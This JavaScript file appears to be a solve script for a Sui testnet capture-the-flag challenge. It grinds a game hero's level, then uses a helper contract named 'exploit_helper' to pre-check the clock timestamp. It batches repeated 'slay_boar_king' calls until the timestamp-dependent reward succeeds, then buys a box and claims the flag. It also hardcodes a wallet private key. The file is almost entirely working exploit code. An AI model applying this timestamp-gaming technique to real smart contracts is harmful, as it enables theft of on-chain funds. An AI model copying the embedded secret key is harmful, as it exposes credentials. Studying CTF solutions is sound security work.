import { Transaction } from '@mysten/sui/transactions';
import { SuiClient, getFullnodeUrl } from '@mysten/sui/client';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import axios from 'axios';


const secretKey = 'suiprivkey1qqsqnl67wmxvme3sv34endnujtr8yp0638vekzt9k5ael07qnrgdu52dr9g';
const keypair = Ed25519Keypair.fromSecretKey(secretKey);
const publicKey = keypair.getPublicKey();
const address = publicKey.toSuiAddress();

const client = new SuiClient({ url: getFullnodeUrl('testnet') });
let balance = await client.getBalance({ owner: address });

console.log('Wallet Address:', address);
console.log('Account Balance:', balance);

const heroId = '0x0cece57616765672738a3b1ba2bd12fd08a15eb48cca482e9a8de4437bfb9390';// heroId
const userTokenAmountId = '0x003b5da41c3314ab252fd3b3eede52ace528f8aec4afbb7b412efbece050afbc';// userTokenAmountId
const PACKAGE_ID = '0xa1f5bf15c4749f9d97f8d4727bb6013389d830613f0f135fe8958d8f43f3a1f7'; // PACKAGE_ID
const HELPER_ID = '0x626de4e6d4c2648304567c34d28b31dd60493bcccdc58dd933a2907de789bdab'; // HELPER_ID
const CLOCK_ID = '0x6';
const suiRpcUrl = 'https://fullnode.testnet.sui.io/';

async function get_hero_status() {
    try {
        const response = await axios.post(suiRpcUrl,{jsonrpc: '2.0',id: 1, method: 'sui_getObject',params: [heroId,{showType: true,showOwner: true,showDepth: true,showContent: true,showDisplay: true,},],},{headers: {'Content-Type': 'application/json',},});
        const fields = response.data.result?.data?.content?.fields;
        if (fields) {console.log('Experience:', fields.experience);console.log('Level', fields.level)} else {console.log('No fields found in the object.');}
        return {
            experience: fields.experience,
            level: fields.level,
        };
    } catch (error) {
        console.error('Error fetching object data:', error.message);
    }
}

async function get_balance() {
    // Step 1: Get balances table ID
    const object = await client.getObject({
        id: userTokenAmountId,
        options: { showContent: true }
    });

    const balancesTableId = object.data?.content?.fields?.balances?.fields?.id?.id;

    if (!balancesTableId) {
        console.error('Failed to extract balances Table ID');
        return;
    }

    // Step 2: Get dynamic field for this address
    const dynamicField = await client.getDynamicFieldObject({
        parentId: balancesTableId,
        name: {
            type: 'address',
            value: address
        }
    });

    const balance = dynamicField.data?.content?.fields?.value;
    console.log(`✅ Balance for ${address}:`, balance);

    return balance;
}

async function get_transaction_events(digest) {
    try {
        const response = await axios.post(suiRpcUrl, {
            jsonrpc: '2.0',
            id: 1,
            method: 'sui_getTransactionBlock',
            params: [
                digest, 
                {showInput: false,showRawInput: false,showEffects: false,showEvents: true, showObjectChanges: false,showBalanceChanges: false}
            ]
        }, {
            headers: {
                'Content-Type': 'application/json'
            }
        });
        const events = response.data.result?.events;
        if (events && events.length > 0) {
            console.log('交易触发的事件列表:');
            let amount = null;
            for (const event of events){
                if (event.parsedJson && 'amount' in event.parsedJson) {
                    amount = parseInt(event.parsedJson.amount, 10); 
                    console.log('Amount:', amount);
                    break;
                }else{
                    console.log('事件内容:', event.parsedJson);
                }
            }
            return amount;
        } else {
            console.log('该交易没有触发任何事件。');
            return 0;
        }

    } catch (error) {
        console.error('获取交易事件失败:', error.message);
        return 0;
    }
}

async function get_newly_created_object(digest) {
    try {
        const response = await axios.post(suiRpcUrl, {
            jsonrpc: '2.0',
            id: 1,
            method: 'sui_getTransactionBlock',
            params: [
                digest,
                {
                    showEffects: true,
                    showObjectChanges: true
                }
            ]
        }, {
            headers: { 'Content-Type': 'application/json' }
        });
        const result = response.data.result;
        const createdObjects = result.effects?.created || [];
        if (createdObjects.length === 0) {
            console.log('未找到新创建的对象');
            return null;
        }

        const newObjectId = createdObjects[0].reference.objectId;
        console.log('新对象 ID:', newObjectId);
        return newObjectId;

    } catch (error) {
        console.error('获取新对象失败:', error.message);
        return null;
    }
}


// 1. level up hero
let i = 0;
while(i<200){
    const { experience, level } = await get_hero_status();
    if (level >= 2) break;
    if (experience >= 100) {
        const tx = new Transaction();
        tx.moveCall({
            target: `${PACKAGE_ID}::hero::level_up`,
            arguments: [tx.object(heroId),]
        });
        const result = await client.signAndExecuteTransaction({signer: keypair,transaction: tx,});
        console.log('Transaction Result:', result);
        break;
    }

    const tx = new Transaction();
    tx.moveCall({
        target: `${PACKAGE_ID}::adventure::slay_boar`,
        arguments: [
            tx.object(heroId),
        ]
    });
    const result = await client.signAndExecuteTransaction({signer: keypair,transaction: tx,});
    console.log('Transaction Result:', result);
}


// 2. initialize sender balance
let sender_balance = await get_balance();
if (!sender_balance) {
    const tx1 = new Transaction();
    tx1.moveCall({
        target: `${PACKAGE_ID}::adventure::init_balances`,
        arguments: [tx1.object(userTokenAmountId),]
    });
    const result1 = await client.signAndExecuteTransaction({signer: keypair,transaction: tx1,});
    console.log('Transaction Result:', result1);
}

if (sender_balance < 200) {
    // 3. slay boar king with timestamp precheck
    while(true){
        const tx3 = new Transaction();
        tx3.moveCall({
            target: `${HELPER_ID}::exploit_helper::check_timestamp`,
            arguments: [tx3.object(CLOCK_ID)],
        });
        for (let i = 0; i < 20; i++) {
            tx3.moveCall({
                target: `${PACKAGE_ID}::adventure::slay_boar_king`,
                arguments: [tx3.object(CLOCK_ID), tx3.object(userTokenAmountId), tx3.object(heroId)]
            });
        }
        // tx3.moveCall({
        //     target: `${PACKAGE_ID}::adventure::slay_boar_king`,
        //     arguments: [tx3.object('0x6'), tx3.object(userTokenAmountId), tx3.object(heroId)]
        // });

        try {
            const result3 = await client.signAndExecuteTransaction({
                signer: keypair,
                transaction: tx3,
                requestType: 'WaitForEffectsCert',
                options: {
                    showEffects: true,
                    showObjectChanges: true
                }
            });
            if (result3.effects.status.status === 'success') {
                console.log('✅ tx3 succeeded!', result3.digest);
                break;
            } else {
                console.error('❌ tx3 failed logically:', result3.effects.status);
            }
        } catch (error) {
            console.log("error_shit", error);
            continue;
        }
    }
}

sender_balance = await get_balance();
console.log("sender balance:", sender_balance);

// 4. buy box
const tx4 = new Transaction();
tx4.moveCall({
    target: `${PACKAGE_ID}::adventure::buy_box`,
    arguments: [tx4.object(userTokenAmountId),]
});
const result4 = await client.signAndExecuteTransaction({signer: keypair,transaction: tx4,});
console.log('Transaction Result:', result4);


// 5. get flag
let newobjectId = await get_newly_created_object(result4.digest);
if (newobjectId != null){
    const tx5 = new Transaction();
    tx5.moveCall({
        target: `${PACKAGE_ID}::inventory::get_flag`,
        arguments: [tx5.object(newobjectId),]
    });
    const result5 = await client.signAndExecuteTransaction({signer: keypair,transaction: tx5,});
    console.log('Transaction Result:', result5);

    await get_transaction_events(result5.digest);
}
